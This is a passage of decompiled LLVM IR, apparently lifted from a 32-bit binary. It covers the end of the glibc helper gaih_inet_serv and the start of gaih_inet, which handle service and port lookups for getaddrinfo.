  %v0_805df65 = load i32, i32* %eax.global-to-local, align 4
  %v2_805df65 = add i32 %v2_805df5b, -8
  %v3_805df65 = inttoptr i32 %v2_805df65 to i32*
  store i32 %v0_805df65, i32* %v3_805df65, align 4
  %v2_805df69 = add i32 %v2_805df5b, -12
  %v3_805df69 = inttoptr i32 %v2_805df69 to i32*
  store i32 %v2_805df66, i32* %v3_805df69, align 4
  %v0_805df6a = load i32, i32* @esi, align 4
  %v2_805df6a = add i32 %v2_805df5b, -16
  %v3_805df6a = inttoptr i32 %v2_805df6a to i32*
  store i32 %v0_805df6a, i32* %v3_805df6a, align 4
  %v0_805df6b = load i32, i32* %edx.global-to-local, align 4
  %v2_805df6b = add i32 %v2_805df5b, -20
  %v3_805df6b = inttoptr i32 %v2_805df6b to i32*
  store i32 %v0_805df6b, i32* %v3_805df6b, align 4
  %v2_805df6f = add i32 %v2_805df5b, -24
  %v3_805df6f = inttoptr i32 %v2_805df6f to i32*
  store i32 %v2_805df6c, i32* %v3_805df6f, align 4
  %v0_805df70 = load i32, i32* @ebx, align 4
  %v1_805df70 = add i32 %v0_805df70, 3
  store i32 %v1_805df70, i32* %eax.global-to-local, align 4
  %v2_805df73 = add i32 %v2_805df5b, -28
  %v3_805df73 = inttoptr i32 %v2_805df73 to i32*
  store i32 %v1_805df70, i32* %v3_805df73, align 4
  %v5_805df74 = add i32 %v2_805df5b, -32
  %v6_805df74 = inttoptr i32 %v5_805df74 to i32*
  store i32 %v0_805df4f, i32* %v6_805df74, align 4
  %v9_805df77 = call i32 @getservbyname_r(i32 %v0_805df52, i32 %v0_805df4f, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_805df77, i32* %eax.global-to-local, align 4
  %v0_805df7c = load i32, i32* @esp, align 4
  %v1_805df7c = add i32 %v0_805df7c, 32
  %v1_805df7f = icmp eq i32 %v9_805df77, 0
  %v1_805df81 = icmp eq i1 %v1_805df7f, false
  br i1 %v1_805df81, label %dec_label_pc_805df8b, label %dec_label_pc_805df83

dec_label_pc_805df83:                             ; preds = %dec_label_pc_805df55
  %v3_805df83 = load i32, i32* %stack_var_-20, align 4
  %v4_805df83 = icmp eq i32 %v3_805df83, 0
  %v1_805df87 = icmp eq i1 %v4_805df83, false
  br i1 %v1_805df87, label %dec_label_pc_805df94, label %dec_label_pc_805dfc7

dec_label_pc_805df8b:                             ; preds = %dec_label_pc_805df55
  %v9_805df8b = icmp eq i32 %v9_805df77, 34
  %v1_805df8e = icmp eq i1 %v9_805df8b, false
  br i1 %v1_805df8e, label %dec_label_pc_805dfc7, label %dec_label_pc_805df90

dec_label_pc_805df90:                             ; preds = %dec_label_pc_805df8b
  %v0_805df90 = load i32, i32* @esi, align 4
  %v2_805df90 = mul i32 %v0_805df90, 2
  store i32 %v2_805df90, i32* @esi, align 4
  br label %dec_label_pc_805df55

dec_label_pc_805df94:                             ; preds = %dec_label_pc_805df83
  %v0_805df94 = load i32, i32* @edi, align 4
  %v1_805df94 = inttoptr i32 %v0_805df94 to i32*
  store i32 0, i32* %v1_805df94, align 4
  %v0_805df9a = load i32, i32* @ebx, align 4
  %v1_805df9a = inttoptr i32 %v0_805df9a to i8*
  %v2_805df9a = load i8, i8* %v1_805df9a, align 1
  %v3_805df9a = sext i8 %v2_805df9a to i32
  store i32 %v3_805df9a, i32* %eax.global-to-local, align 4
  %v1_805df9d = load i32, i32* @edi, align 4
  %v2_805df9d = add i32 %v1_805df9d, 4
  %v3_805df9d = inttoptr i32 %v2_805df9d to i32*
  store i32 %v3_805df9a, i32* %v3_805df9d, align 4
  %v0_805dfa0 = load i32, i32* @ebx, align 4
  %v1_805dfa0 = add i32 %v0_805dfa0, 2
  %v2_805dfa0 = inttoptr i32 %v1_805dfa0 to i8*
  %v3_805dfa0 = load i8, i8* %v2_805dfa0, align 1
  %v4_805dfa0 = and i8 %v3_805dfa0, 2
  %v5_805dfa0 = icmp eq i8 %v4_805dfa0, 0
  br i1 %v5_805dfa0, label %dec_label_pc_805dfb5, label %dec_label_pc_805dfa6

dec_label_pc_805dfa6:                             ; preds = %dec_label_pc_805df94
  store i32 %v0_805df52, i32* %edx.global-to-local, align 4
  %v1_805dfa9 = add i32 %v0_805df52, 12
  %v2_805dfa9 = inttoptr i32 %v1_805dfa9 to i32*
  %v3_805dfa9 = load i32, i32* %v2_805dfa9, align 4
  br label %dec_label_pc_805dfb9

dec_label_pc_805dfb5:                             ; preds = %dec_label_pc_805df94
  %v1_805dfb5 = add i32 %v0_805dfa0, 1
  %v2_805dfb5 = inttoptr i32 %v1_805dfb5 to i8*
  %v3_805dfb5 = load i8, i8* %v2_805dfb5, align 1
  %v4_805dfb5 = sext i8 %v3_805dfb5 to i32
  br label %dec_label_pc_805dfb9

dec_label_pc_805dfb9:                             ; preds = %dec_label_pc_805dfa6, %dec_label_pc_805dfb5
  %storemerge1 = phi i32 [ %v3_805dfa9, %dec_label_pc_805dfa6 ], [ %v4_805dfb5, %dec_label_pc_805dfb5 ]
  %v1_805dfb9 = load i32, i32* @edi, align 4
  %v2_805dfb9 = add i32 %v1_805dfb9, 8
  %v3_805dfb9 = inttoptr i32 %v2_805dfb9 to i32*
  store i32 %storemerge1, i32* %v3_805dfb9, align 4
  %v3_805dfbc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805dfbc, i32* %eax.global-to-local, align 4
  %v1_805dfbf = add i32 %v3_805dfbc, 8
  %v2_805dfbf = inttoptr i32 %v1_805dfbf to i32*
  %v3_805dfbf = load i32, i32* %v2_805dfbf, align 4
  store i32 %v3_805dfbf, i32* %eax.global-to-local, align 4
  %v1_805dfc2 = load i32, i32* @edi, align 4
  %v2_805dfc2 = add i32 %v1_805dfc2, 12
  %v3_805dfc2 = inttoptr i32 %v2_805dfc2 to i32*
  store i32 %v3_805dfbf, i32* %v3_805dfc2, align 4
  br label %dec_label_pc_805dfc7

dec_label_pc_805dfc7:                             ; preds = %dec_label_pc_805df8b, %dec_label_pc_805df83, %dec_label_pc_805dfb9
  %storemerge = phi i32 [ 0, %dec_label_pc_805dfb9 ], [ 264, %dec_label_pc_805df83 ], [ 264, %dec_label_pc_805df8b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805dfca = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805dfca, i32* @ebx, align 4
  store i32 %v0_805df40, i32* @esi, align 4
  store i32 %v0_805df3f, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_805df52, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_805dfc7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dfb9, { 1, 0 }
}

define i32 @gaih_inet(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i8*, align 4
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %tmp116 = inttoptr i32 %arg3 to i8*
  %stack_var_-114 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-268 = alloca i8*, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-237 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_805dfd4 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_805dfde = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805dfde, i32* %eax.global-to-local, align 4
  store i32 %v2_805dfde, i32* %stack_var_-20, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v1_805dfee = add i32 %arg3, 4
  %v2_805dfee = inttoptr i32 %v1_805dfee to i32*
  %v3_805dfee = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805dfee, i32* %eax.global-to-local, align 4
  %v1_805dff1 = icmp eq i32 %v3_805dfee, 0
  br i1 %v1_805dff1, label %dec_label_pc_805e004, label %dec_label_pc_805dff5

dec_label_pc_805dff5:                             ; preds = %entry
  %v9_805dff5 = icmp eq i32 %v3_805dfee, 10
  %v1_805e002 = icmp eq i1 %v9_805dff5, false
  br i1 %v1_805e002, label %dec_label_pc_805e01a, label %dec_label_pc_805e004

dec_label_pc_805e004:                             ; preds = %dec_label_pc_805dff5, %entry
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_805e007 = inttoptr i32 %arg3 to i32*
  %v2_805e007 = load i32, i32* %v1_805e007, align 4
  %v1_805e009 = udiv i32 %v2_805e007, 8
  %v1_805e011 = urem i32 %v1_805e009, 2
  store i32 %v1_805e011, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e01a

dec_label_pc_805e01a:                             ; preds = %dec_label_pc_805dff5, %dec_label_pc_805e004
  %stack_var_-160.0 = phi i32 [ %v1_805e011, %dec_label_pc_805e004 ], [ 0, %dec_label_pc_805dff5 ]
  store i32 %v2_805dfde, i32* %eax.global-to-local, align 4
  %v3_805e023 = bitcast i32* %stack_var_-48 to i8*
  %v4_805e023 = call i32 @__GI_memset(i8* %v3_805e023, i32 0, i32 16)
  store i32 %v4_805e023, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_805e02e = add i32 %arg3, 12
  %v2_805e02e = inttoptr i32 %v1_805e02e to i32*
  %v3_805e02e = load i32, i32* %v2_805e02e, align 4
  store i32 %v3_805e02e, i32* @ecx, align 4
  %v1_805e031 = icmp eq i32 %v3_805e02e, 0
  br i1 %v1_805e031, label %dec_label_pc_805e03c, label %dec_label_pc_805e01a.dec_label_pc_805e04a.preheader_crit_edge

dec_label_pc_805e01a.dec_label_pc_805e04a.preheader_crit_edge: ; preds = %dec_label_pc_805e01a
  %.pre = add i32 %arg3, 8
  %.pre103 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_805e04a.preheader

dec_label_pc_805e03c:                             ; preds = %dec_label_pc_805e01a
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805e03f = add i32 %arg3, 8
  %v2_805e03f = inttoptr i32 %v1_805e03f to i32*
  %v3_805e03f = load i32, i32* %v2_805e03f, align 4
  %v4_805e03f = icmp eq i32 %v3_805e03f, 0
  %v1_805e043 = icmp eq i1 %v4_805e03f, false
  br i1 %v1_805e043, label %dec_label_pc_805e04a.preheader, label %dec_label_pc_805e09a

dec_label_pc_805e04a.preheader:                   ; preds = %dec_label_pc_805e01a.dec_label_pc_805e04a.preheader_crit_edge, %dec_label_pc_805e03c
  %v2_805e05a.pre-phi = phi i32* [ %.pre103, %dec_label_pc_805e01a.dec_label_pc_805e04a.preheader_crit_edge ], [ %v2_805e03f, %dec_label_pc_805e03c ]
  store i32 ptrtoint (i8** @global_var_806e527.664 to i32), i32* @ebx, align 4
  %v3_805e04a202 = load i8, i8* inttoptr (i32 add (i32 ptrtoint (i8** @global_var_806e527.664 to i32), i32 3) to i8*), align 1
  %v4_805e04a203 = zext i8 %v3_805e04a202 to i32
  %v6_805e04a204 = and i32 %arg3, -256
  %v7_805e04a205 = or i32 %v4_805e04a203, %v6_805e04a204
  store i32 %v7_805e04a205, i32* %edx.global-to-local, align 4
  %v4_805e04d206 = icmp eq i8 %v3_805e04a202, 0
  br i1 %v4_805e04d206, label %dec_label_pc_805e083, label %dec_label_pc_805e057

dec_label_pc_805e047:                             ; preds = %dec_label_pc_805e072, %dec_label_pc_805e061
  %v5_805e04a67 = phi i32 [ %v5_805e04a66, %dec_label_pc_805e072 ], [ %v3_805e05a, %dec_label_pc_805e061 ]
  %v1_805e047 = add i32 %v0_805e047208, 7
  store i32 %v1_805e047, i32* @ebx, align 4
  %v1_805e04a = add i32 %v0_805e047208, 10
  %v2_805e04a = inttoptr i32 %v1_805e04a to i8*
  %v3_805e04a = load i8, i8* %v2_805e04a, align 1
  %v4_805e04a = zext i8 %v3_805e04a to i32
  %v6_805e04a = and i32 %v5_805e04a67, -256
  %v7_805e04a = or i32 %v4_805e04a, %v6_805e04a
  store i32 %v7_805e04a, i32* %edx.global-to-local, align 4
  %v4_805e04d = icmp eq i8 %v3_805e04a, 0
  br i1 %v4_805e04d, label %dec_label_pc_805e083, label %dec_label_pc_805e057

dec_label_pc_805e057:                             ; preds = %dec_label_pc_805e04a.preheader, %dec_label_pc_805e047
  %v0_805e047208 = phi i32 [ %v1_805e047, %dec_label_pc_805e047 ], [ ptrtoint (i8** @global_var_806e527.664 to i32), %dec_label_pc_805e04a.preheader ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805e05a = load i32, i32* %v2_805e05a.pre-phi, align 4
  store i32 %v3_805e05a, i32* %edx.global-to-local, align 4
  %v1_805e05d = icmp eq i32 %v3_805e05a, 0
  br i1 %v1_805e05d, label %dec_label_pc_805e068, label %dec_label_pc_805e061

dec_label_pc_805e061:                             ; preds = %dec_label_pc_805e057
  %v1_805e061 = inttoptr i32 %v0_805e047208 to i8*
  %v2_805e061 = load i8, i8* %v1_805e061, align 1
  %v3_805e061 = sext i8 %v2_805e061 to i32
  store i32 %v3_805e061, i32* %eax.global-to-local, align 4
  %v12_805e064 = icmp eq i32 %v3_805e05a, %v3_805e061
  %v1_805e066 = icmp eq i1 %v12_805e064, false
  br i1 %v1_805e066, label %dec_label_pc_805e047, label %dec_label_pc_805e068

dec_label_pc_805e068:                             ; preds = %dec_label_pc_805e061, %dec_label_pc_805e057
  %v5_805e04a66 = phi i32 [ %v3_805e05a, %dec_label_pc_805e061 ], [ 0, %dec_label_pc_805e057 ]
  br i1 %v1_805e031, label %dec_label_pc_805e07a, label %dec_label_pc_805e06c

dec_label_pc_805e06c:                             ; preds = %dec_label_pc_805e068
  %v1_805e06c = add i32 %v0_805e047208, 2
  %v2_805e06c = inttoptr i32 %v1_805e06c to i8*
  %v3_805e06c = load i8, i8* %v2_805e06c, align 1
  %v4_805e06c = and i8 %v3_805e06c, 2
  %v5_805e06c = icmp eq i8 %v4_805e06c, 0
  %v1_805e070 = icmp eq i1 %v5_805e06c, false
  br i1 %v1_805e070, label %dec_label_pc_805e07a, label %dec_label_pc_805e072

dec_label_pc_805e072:                             ; preds = %dec_label_pc_805e06c
  %v1_805e072 = add i32 %v0_805e047208, 1
  %v2_805e072 = inttoptr i32 %v1_805e072 to i8*
  %v3_805e072 = load i8, i8* %v2_805e072, align 1
  %v4_805e072 = sext i8 %v3_805e072 to i32
  store i32 %v4_805e072, i32* %eax.global-to-local, align 4
  %v12_805e076 = icmp eq i32 %v3_805e02e, %v4_805e072
  %v1_805e078 = icmp eq i1 %v12_805e076, false
  br i1 %v1_805e078, label %dec_label_pc_805e047, label %dec_label_pc_805e07a

dec_label_pc_805e07a:                             ; preds = %dec_label_pc_805e072, %dec_label_pc_805e06c, %dec_label_pc_805e068
  br label %dec_label_pc_805e09f

dec_label_pc_805e083:                             ; preds = %dec_label_pc_805e047, %dec_label_pc_805e04a.preheader
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 263, i32* %eax.global-to-local, align 4
  %v3_805e08b = load i32, i32* %v2_805e05a.pre-phi, align 4
  %v4_805e08b = icmp eq i32 %v3_805e08b, 0
  %v1_805e08f = icmp eq i1 %v4_805e08b, false
  br i1 %v1_805e08f, label %dec_label_pc_805e960, label %dec_label_pc_805e930

dec_label_pc_805e09a:                             ; preds = %dec_label_pc_805e03c
  store i32 ptrtoint (i32* @global_var_806e520.665 to i32), i32* @ebx, align 4
  br label %dec_label_pc_805e09f

dec_label_pc_805e09f:                             ; preds = %dec_label_pc_805e07a, %dec_label_pc_805e09a
  %v0_805e1ea = phi i32 [ %v0_805e047208, %dec_label_pc_805e07a ], [ ptrtoint (i32* @global_var_806e520.665 to i32), %dec_label_pc_805e09a ]
  %v1_805e09f = icmp eq i32 %arg2, 0
  br i1 %v1_805e09f, label %dec_label_pc_805e1ca, label %dec_label_pc_805e0a7

dec_label_pc_805e0a7:                             ; preds = %dec_label_pc_805e09f
  %v1_805e0a7 = add i32 %v0_805e1ea, 2
  %v2_805e0a7 = inttoptr i32 %v1_805e0a7 to i8*
  %v3_805e0a7 = load i8, i8* %v2_805e0a7, align 1
  %v4_805e0a7 = urem i8 %v3_805e0a7, 2
  %v5_805e0a7 = icmp eq i8 %v4_805e0a7, 0
  %v1_805e0ab = icmp eq i1 %v5_805e0a7, false
  br i1 %v1_805e0ab, label %dec_label_pc_805e930, label %dec_label_pc_805e0b1

dec_label_pc_805e0b1:                             ; preds = %dec_label_pc_805e0a7
  %v1_805e0b1 = add i32 %arg2, 4
  %v2_805e0b1 = inttoptr i32 %v1_805e0b1 to i32*
  %v3_805e0b1 = load i32, i32* %v2_805e0b1, align 4
  %v5_805e0b1 = icmp slt i32 %v3_805e0b1, 0
  %v1_805e0b5 = icmp eq i1 %v5_805e0b1, false
  br i1 %v1_805e0b5, label %dec_label_pc_805e180, label %dec_label_pc_805e0bb

dec_label_pc_805e0bb:                             ; preds = %dec_label_pc_805e0b1
  %v1_805e0bb = add i32 %v0_805e1ea, 3
  %v2_805e0bb = inttoptr i32 %v1_805e0bb to i8*
  %v3_805e0bb = load i8, i8* %v2_805e0bb, align 1
  %v4_805e0bb = icmp eq i8 %v3_805e0bb, 0
  br i1 %v4_805e0bb, label %dec_label_pc_805e0ee, label %dec_label_pc_805e0c1

dec_label_pc_805e0c1:                             ; preds = %dec_label_pc_805e0bb
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805e1ea, i32* @edx, align 4
  %v8_805e0d0 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v8_805e0d0, i32* %eax.global-to-local, align 4
  store i32 %v8_805e0d0, i32* %stack_var_-20, align 4
  %v1_805e0d7 = inttoptr i32 %arg2 to i32*
  %v2_805e0d7 = load i32, i32* %v1_805e0d7, align 4
  store i32 %v2_805e0d7, i32* @eax, align 4
  %v2_805e0d9 = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-192)
  store i32 %v2_805e0d9, i32* %eax.global-to-local, align 4
  %v1_805e0e1 = icmp eq i32 %v2_805e0d9, 0
  br i1 %v1_805e0e1, label %dec_label_pc_805e250, label %dec_label_pc_805e960

dec_label_pc_805e0ee:                             ; preds = %dec_label_pc_805e0bb
  %v2_805e0ee = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805e0ee, i32* @ecx, align 4
  %v1_805e0f1 = add i32 %v0_805e1ea, 7
  store i32 %v1_805e0f1, i32* @esi, align 4
  %v1_805e16950 = add i32 %v0_805e1ea, 10
  %v2_805e16951 = inttoptr i32 %v1_805e16950 to i8*
  %v3_805e16952 = load i8, i8* %v2_805e16951, align 1
  %v4_805e16953 = icmp eq i8 %v3_805e16952, 0
  %v1_805e16d59 = icmp eq i1 %v4_805e16953, false
  br i1 %v1_805e16d59, label %dec_label_pc_805e0fc.lr.ph, label %dec_label_pc_805e16f

dec_label_pc_805e0fc.lr.ph:                       ; preds = %dec_label_pc_805e0ee
  %v1_805e108 = add i32 %arg3, 8
  %v2_805e108 = inttoptr i32 %v1_805e108 to i32*
  %v8_805e13c = ptrtoint i32* %stack_var_-192 to i32
  %v1_805e140 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_805e0fc

dec_label_pc_805e0fc:                             ; preds = %dec_label_pc_805e0fc.lr.ph, %dec_label_pc_805e166
  %v0_805e133 = phi i32 [ %v1_805e0f1, %dec_label_pc_805e0fc.lr.ph ], [ %v1_805e166, %dec_label_pc_805e166 ]
  %stack_var_-156.160 = phi i32 [ %v2_805e0ee, %dec_label_pc_805e0fc.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_805e166 ]
  %v1_805e0fc = add i32 %v0_805e133, 2
  %v2_805e0fc = inttoptr i32 %v1_805e0fc to i8*
  %v3_805e0fc = load i8, i8* %v2_805e0fc, align 1
  %v4_805e0fc = sext i8 %v3_805e0fc to i32
  store i32 %v4_805e0fc, i32* @ecx, align 4
  %v2_805e100 = urem i8 %v3_805e0fc, 2
  %v3_805e100 = icmp eq i8 %v2_805e100, 0
  %v1_805e103 = icmp eq i1 %v3_805e100, false
  br i1 %v1_805e103, label %dec_label_pc_805e166, label %dec_label_pc_805e105

dec_label_pc_805e105:                             ; preds = %dec_label_pc_805e0fc
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805e108 = load i32, i32* %v2_805e108, align 4
  store i32 %v3_805e108, i32* %edx.global-to-local, align 4
  %v1_805e10b = icmp eq i32 %v3_805e108, 0
  br i1 %v1_805e10b, label %dec_label_pc_805e116, label %dec_label_pc_805e10f

dec_label_pc_805e10f:                             ; preds = %dec_label_pc_805e105
  %v1_805e10f = inttoptr i32 %v0_805e133 to i8*
  %v2_805e10f = load i8, i8* %v1_805e10f, align 1
  %v3_805e10f = sext i8 %v2_805e10f to i32
  store i32 %v3_805e10f, i32* %eax.global-to-local, align 4
  %v12_805e112 = icmp eq i32 %v3_805e108, %v3_805e10f
  %v1_805e114 = icmp eq i1 %v12_805e112, false
  br i1 %v1_805e114, label %dec_label_pc_805e166, label %dec_label_pc_805e116

dec_label_pc_805e116:                             ; preds = %dec_label_pc_805e10f, %dec_label_pc_805e105
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805e119 = load i32, i32* %v2_805e02e, align 4
  store i32 %v3_805e119, i32* %edx.global-to-local, align 4
  %v1_805e11c = icmp eq i32 %v3_805e119, 0
  br i1 %v1_805e11c, label %dec_label_pc_805e12d, label %dec_label_pc_805e120

dec_label_pc_805e120:                             ; preds = %dec_label_pc_805e116
  %v2_805e120 = and i32 %v4_805e0fc, 2
  %v3_805e120 = icmp eq i32 %v2_805e120, 0
  %v1_805e123 = icmp eq i1 %v3_805e120, false
  br i1 %v1_805e123, label %dec_label_pc_805e12d, label %dec_label_pc_805e125

dec_label_pc_805e125:                             ; preds = %dec_label_pc_805e120
  %v1_805e125 = add i32 %v0_805e133, 1
  %v2_805e125 = inttoptr i32 %v1_805e125 to i8*
  %v3_805e125 = load i8, i8* %v2_805e125, align 1
  %v4_805e125 = sext i8 %v3_805e125 to i32
  store i32 %v4_805e125, i32* %eax.global-to-local, align 4
  %v12_805e129 = icmp eq i32 %v3_805e119, %v4_805e125
  %v1_805e12b = icmp eq i1 %v12_805e129, false
  br i1 %v1_805e12b, label %dec_label_pc_805e166, label %dec_label_pc_805e12d

dec_label_pc_805e12d:                             ; preds = %dec_label_pc_805e125, %dec_label_pc_805e120, %dec_label_pc_805e116
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805e133, i32* @edx, align 4
  store i32 %v8_805e13c, i32* @ebx, align 4
  %v2_805e140 = load i32, i32* %v1_805e140, align 4
  store i32 %v2_805e140, i32* @eax, align 4
  %v2_805e142 = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-192)
  store i32 %v2_805e142, i32* %eax.global-to-local, align 4
  %v1_805e14a = icmp eq i32 %v2_805e142, 0
  br i1 %v1_805e14a, label %dec_label_pc_805e158, label %dec_label_pc_805e14e

dec_label_pc_805e14e:                             ; preds = %dec_label_pc_805e12d
  %v3_805e14e = and i32 %v2_805e142, 256
  %v4_805e14e = icmp eq i32 %v3_805e14e, 0
  %v1_805e151 = icmp eq i1 %v4_805e14e, false
  br i1 %v1_805e151, label %dec_label_pc_805e166, label %dec_label_pc_805e960

dec_label_pc_805e158:                             ; preds = %dec_label_pc_805e12d
  store i32 %stack_var_-156.160, i32* %edx.global-to-local, align 4
  %v2_805e15e = inttoptr i32 %stack_var_-156.160 to i32*
  store i32 %v8_805e13c, i32* %v2_805e15e, align 4
  br label %dec_label_pc_805e166

dec_label_pc_805e166:                             ; preds = %dec_label_pc_805e14e, %dec_label_pc_805e125, %dec_label_pc_805e10f, %dec_label_pc_805e0fc, %dec_label_pc_805e158
  %stack_var_-156.0 = phi i32 [ %stack_var_-156.160, %dec_label_pc_805e0fc ], [ %v8_805e13c, %dec_label_pc_805e158 ], [ %stack_var_-156.160, %dec_label_pc_805e14e ], [ %stack_var_-156.160, %dec_label_pc_805e125 ], [ %stack_var_-156.160, %dec_label_pc_805e10f ]
  %v0_805e166 = load i32, i32* @esi, align 4
  %v1_805e166 = add i32 %v0_805e166, 7
  store i32 %v1_805e166, i32* @esi, align 4
  %v1_805e169 = add i32 %v0_805e166, 10
  %v2_805e169 = inttoptr i32 %v1_805e169 to i8*
  %v3_805e169 = load i8, i8* %v2_805e169, align 1
  %v4_805e169 = icmp eq i8 %v3_805e169, 0
  %v1_805e16d = icmp eq i1 %v4_805e169, false
  br i1 %v1_805e16d, label %dec_label_pc_805e0fc, label %dec_label_pc_805e16f

dec_label_pc_805e16f:                             ; preds = %dec_label_pc_805e166, %dec_label_pc_805e0ee
  store i32 %v2_805dfde, i32* %eax.global-to-local, align 4
  %v3_805e172 = load i32, i32* %stack_var_-20, align 4
  %v15_805e172 = icmp eq i32 %v3_805e172, %v2_805dfde
  %v1_805e175 = icmp eq i1 %v15_805e172, false
  br i1 %v1_805e175, label %dec_label_pc_805e250, label %dec_label_pc_805e930

dec_label_pc_805e180:                             ; preds = %dec_label_pc_805e0b1
  %v8_805e187 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v8_805e187, i32* %eax.global-to-local, align 4
  store i32 %v8_805e187, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_805e193 = inttoptr i32 %v0_805e1ea to i8*
  %v2_805e193 = load i8, i8* %v1_805e193, align 1
  %v3_805e193 = sext i8 %v2_805e193 to i32
  store i32 %v3_805e193, i32* %edx.global-to-local, align 4
  store i32 %v8_805e187, i32* %eax.global-to-local, align 4
  %v2_805e199 = add i32 %v8_805e187, 4
  %v3_805e199 = inttoptr i32 %v2_805e199 to i32*
  store i32 %v3_805e193, i32* %v3_805e199, align 4
  %v0_805e19c = load i32, i32* @ebx, align 4
  %v1_805e19c = add i32 %v0_805e19c, 2
  %v2_805e19c = inttoptr i32 %v1_805e19c to i8*
  %v3_805e19c = load i8, i8* %v2_805e19c, align 1
  %v4_805e19c = and i8 %v3_805e19c, 2
  %v5_805e19c = icmp eq i8 %v4_805e19c, 0
  %v3_805e1a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e1a0, i32* %edx.global-to-local, align 4
  br i1 %v5_805e19c, label %dec_label_pc_805e1ad, label %dec_label_pc_805e1a5

dec_label_pc_805e1a5:                             ; preds = %dec_label_pc_805e180
  store i32 %arg3, i32* @ecx, align 4
  %v3_805e1a8 = load i32, i32* %v2_805e02e, align 4
  br label %dec_label_pc_805e1b1

dec_label_pc_805e1ad:                             ; preds = %dec_label_pc_805e180
  %v1_805e1ad = add i32 %v0_805e19c, 1
  %v2_805e1ad = inttoptr i32 %v1_805e1ad to i8*
  %v3_805e1ad = load i8, i8* %v2_805e1ad, align 1
  %v4_805e1ad = sext i8 %v3_805e1ad to i32
  br label %dec_label_pc_805e1b1

dec_label_pc_805e1b1:                             ; preds = %dec_label_pc_805e1a5, %dec_label_pc_805e1ad
  %storemerge13 = phi i32 [ %v3_805e1a8, %dec_label_pc_805e1a5 ], [ %v4_805e1ad, %dec_label_pc_805e1ad ]
  store i32 %storemerge13, i32* %eax.global-to-local, align 4
  %v2_805e1b1 = add i32 %v3_805e1a0, 8
  %v3_805e1b1 = inttoptr i32 %v2_805e1b1 to i32*
  store i32 %storemerge13, i32* %v3_805e1b1, align 4
  %v3_805e1b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e1b4, i32* %edx.global-to-local, align 4
  %v2_805e1b7 = inttoptr i32 %v1_805e0b1 to i16*
  %v3_805e1b7 = load i16, i16* %v2_805e1b7, align 2
  %v2_805e1bb = call i16 @llvm.bswap.i16(i16 %v3_805e1b7)
  %v3_805e1bb = zext i16 %v2_805e1bb to i32
  store i32 %v3_805e1bb, i32* %eax.global-to-local, align 4
  %v2_805e1c2 = add i32 %v3_805e1b4, 12
  %v3_805e1c2 = inttoptr i32 %v2_805e1c2 to i32*
  store i32 %v3_805e1bb, i32* %v3_805e1c2, align 4
  br label %dec_label_pc_805e250

dec_label_pc_805e1ca:                             ; preds = %dec_label_pc_805e09f
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805e1cd = add i32 %arg3, 8
  %v2_805e1cd = inttoptr i32 %v1_805e1cd to i32*
  %v3_805e1cd = load i32, i32* %v2_805e1cd, align 4
  %v4_805e1cd = icmp eq i32 %v3_805e1cd, 0
  %v1_805e1d1 = icmp eq i1 %v4_805e1cd, false
  br i1 %v1_805e1d1, label %dec_label_pc_805e1d7, label %dec_label_pc_805e1d3

dec_label_pc_805e1d3:                             ; preds = %dec_label_pc_805e1ca
  br i1 %v1_805e031, label %dec_label_pc_805e217, label %dec_label_pc_805e1d7

dec_label_pc_805e1d7:                             ; preds = %dec_label_pc_805e1d3, %dec_label_pc_805e1ca
  %v8_805e1de = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v8_805e1de, i32* %eax.global-to-local, align 4
  store i32 %v8_805e1de, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-192, align 4
